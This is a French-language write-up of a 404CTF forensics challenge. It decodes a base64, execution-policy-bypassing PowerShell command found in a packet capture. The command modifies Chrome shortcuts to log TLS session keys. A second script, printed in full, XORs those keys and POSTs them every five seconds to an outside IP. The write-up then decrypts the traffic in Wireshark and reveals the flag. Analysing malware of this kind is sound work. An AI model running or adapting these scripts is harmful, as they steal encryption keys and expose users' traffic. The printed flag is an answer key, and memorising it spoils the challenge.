# Initial connection

Frame 81:
```sh
power -ep Bypass -EncodedCommand
ZgBvAHIAZQBhAGMAaAAoACQAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAIABpAG4AIABHAGUAdAAtAEMAaABpAGwAZABJAHQAZQBtACAALQBSAGUAYwB1AHIAcwBlACAALQBQAGEAdABoACAAQwA6AFwAVQBzAGUAcgBzACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBJAG4AYwBsAHUAZABlACAAKgAuAGwAbgBrACkAewAkAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AQwBPAE0AIABXAFMAYwByAGkAcAB0AC4AUwBoAGUAbABsADsAJABiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAD0AJABiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgAuAEMAcgBlAGEAdABlAFMAaABvAHIAdABjAHUAdAAoACQAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAKQA7AGkAZgAoACQAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgAuAFQAYQByAGcAZQB0AFAAYQB0AGgAIAAtAG0AYQB0AGMAaAAgACcAYwBoAHIAbwBtAGUAXAAuAGUAeABlACQAJwApAHsAJABiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAC4AQQByAGcAdQBtAGUAbgB0AHMAPQAiAC0ALQBzAHMAbAAtAGsAZQB5AC0AbABvAGcALQBmAGkAbABlAD0AJABlAG4AdgA6AFQARQBNAFAAXABkAGUAZgBlAG4AZABlAHIALQByAGUAcwAuAHQAeAB0ACIAOwAkAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIALgBTAGEAdgBlACgAKQA7AH0AfQAKAA==
```
<=> (décode base64)
```powershell
foreach($bbbbbbbbbbbb in Get-ChildItem -Recurse -Path C:\Users -ErrorAction SilentlyContinue -Include *.lnk){
	$bbbbbbbbbbbbbbb=New-Object -COM WScript.Shell;
	$bbbbbbbbbbbbbbbb=$bbbbbbbbbbbbbbb.CreateShortcut($bbbbbbbbbbbb);
	if($bbbbbbbbbbbbbbbb.TargetPath -match 'chrome\.exe$'){
		$bbbbbbbbbbbbbbbb.Arguments="--ssl-key-log-file=$env:TEMP\defender-res.txt";
		$bbbbbbbbbbbbbbbb.Save();
	}
}
```
=> (déobfuscation)
```powershell
foreach($file in Get-ChildItem -Recurse -Path C:\Users -ErrorAction SilentlyContinue -Include *.lnk){
	$shell = New-Object -COM WScript.Shell;
	$shortcut = $shell.CreateShortcut($file);
	if($shortcut.TargetPath -match 'chrome\.exe$'){
		$shortcut.Arguments="--ssl-key-log-file=$env:TEMP\defender-res.txt";
		$shortcut.Save();
	}
}
```
Créé un raccourci bureau de Chrome avec l'option `--ssl-key-log-file=...` qui dump les clés ssl vers un fichier

Ensuite:
```powershell
$occ_one=0;
$ssl_key_path="$env:TEMP\defender-res.txt";
$xored_payload=[byte[]](...);
while($true){
    $ssl_key_file=Get-Item -Path $ssl_key_path;
    $ssl_key_size=$ssl_key_file.Length;
    if($ssl_key_size -gt $occ_one){
        $f=[System.IO.File]::Open($ssl_key_path,[System.IO.FileMode]::Open, [System.IO.FileAccess]::Read,[System.IO.FileShare]::ReadWrite);
        $f.Seek($occ_one,[System.IO.SeekOrigin]::Begin)|Out-Null;
        $byte_array=New-Object byte[] ($ssl_key_size - $occ_one);
        $f.read($byte_array,0,$ssl_key_size - $occ_one)|Out-Null;
        for($i=0; $i -lt $byte_array.count; $i++){
            $byte_array[$i]=$byte_array[$i] -bxor $xored_payload[$i % $xored_payload.count];
        }
        $data=[Convert]::ToBase64String($byte_array);
        Invoke-WebRequest -Uri http://192.168.78.89/index.html -Method POST -Body $data|Out-Null;
        $f.Close()|Out-Null;
    }
    $occ_one=$ssl_key_size;
    Start-Sleep -Seconds 5;
}
```
Toute les 5 secondes on lit les nouvelles clés ajoutées au fichier, on les xor, converti en base 64, puis on les envoie à http://192.168.78.89/index.html en méthode POST

On peut récupérer ces clés ssl dans les paquets de la capture, on les décode depuis la base64, puis on xor avec *xored_payload* pour les déchiffrer.
```
CLIENT_HANDSHAKE_TRAFFIC_SECRET 92e8f63a29e3efd3b2b90ba2e4f8fd18d3fd4ea196c01f32cb8dabf7b580f2d6 ...
...
EXPORTER_SECRET 607eef4a30cf74c0be7a9516f8a4e11657efea25bc59b6a487b2a9f9208c6ee3 e5ded8ecc600521a42c8ef890e2a286af4ffb2abdc6f708f211ef28dc34c7bcc
```

Enfin on peut importer ces clés ssl dans wireshark pour déchiffrer les trames envoyées en HTTPS en suivant [cette page](https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA14u000000wkvECAQ&lang=en_US%E2%80%A9).
Dedans on y retrouve le flag (rapidement avec un Ctrl+F sur `404CTF{`):
```html
          <span class="note">404CTF{En_pl31n_d4ns_l3_1337_v1@_sUp3r_TLS_d3crypt0r}</span>
```